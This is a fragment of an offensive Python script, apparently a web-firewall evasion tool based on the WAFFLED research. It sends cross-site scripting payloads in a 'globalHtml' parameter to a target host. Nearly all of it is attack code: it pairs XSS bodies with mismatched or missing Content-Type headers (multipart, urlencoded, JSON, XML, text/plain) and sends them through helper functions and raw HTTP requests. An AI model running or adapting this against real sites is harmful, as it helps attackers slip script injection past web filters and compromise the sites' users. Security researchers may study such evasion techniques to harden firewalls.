# ═══════════════════════════════════════════════════════════════
# B. CONTENT-TYPE INTERCHANGEABILITY (Technique #8, WAFFLED key)
# ═══════════════════════════════════════════════════════════════
print("
--- B: Content-Type Interchangeability ---")

# WAFFLED key finding: many frameworks parse both multipart and urlencoded
# using the same API. Send multipart body with urlencoded Content-Type and vice versa.

CT_INTERCHANGE = [
    # Send urlencoded body with multipart CT
    ("multipart/form-data; boundary=none", f"globalHtml={urllib.parse.quote(XSS_S)}".encode()),
    # Send multipart body with urlencoded CT
    ("application/x-www-form-urlencoded",
     f"--bound
Content-Disposition: form-data; name=\"globalHtml\"

{XSS_S}
--bound--
".encode()),
    # Send JSON body with urlencoded CT
    ("application/x-www-form-urlencoded", json.dumps({"globalHtml": XSS_S}).encode()),
    # Send urlencoded body with JSON CT
    ("application/json", f"globalHtml={urllib.parse.quote(XSS_S)}".encode()),
    # Send JSON body with multipart CT
    ("multipart/form-data; boundary=jsonbound", json.dumps({"globalHtml": XSS_S}).encode()),
    # Send multipart body with JSON CT
    ("application/json",
     f"--jbound
Content-Disposition: form-data; name=\"globalHtml\"

{XSS_S}
--jbound--
".encode()),
    # Send urlencoded body with XML CT
    ("application/xml", f"globalHtml={urllib.parse.quote(XSS_S)}".encode()),
    # Send XML body with urlencoded CT
    ("application/x-www-form-urlencoded",
     f'<?xml version="1.0"?><root><globalHtml>{XSS_S}</globalHtml></root>'.encode()),
    # Send JSON body with text/plain
    ("text/plain", json.dumps({"globalHtml": XSS_S}).encode()),
    # Send urlencoded body with text/plain
    ("text/plain", f"globalHtml={urllib.parse.quote(XSS_S)}".encode()),
    # Send multipart body with text/plain
    ("text/plain",
     f"--tpbound
Content-Disposition: form-data; name=\"globalHtml\"

{XSS_S}
--tpbound--
".encode()),
    # No content-type at all
    ("", f"globalHtml={urllib.parse.quote(XSS_S)}".encode()),
    ("", json.dumps({"globalHtml": XSS_S}).encode()),
]

for xss in [XSS_S, XSS_IMG, XSS]:
    for ct, body_template in CT_INTERCHANGE:
        body = body_template.replace(XSS_S.encode(), xss.encode()) if isinstance(body_template, bytes) else body_template
        if ct:
            post_raw(body, ct=ct, label=f"interchange-{ct[:20]}")
        else:
            raw_req(
                b"POST / HTTP/1.1
Host: " + HOST.encode() + b"
"
                b"Content-Length: " + str(len(body)).encode() + b"
"
                b"Connection: close

" + body,
                label="no-ct")

print(f"  CT interchange done: {total} total")
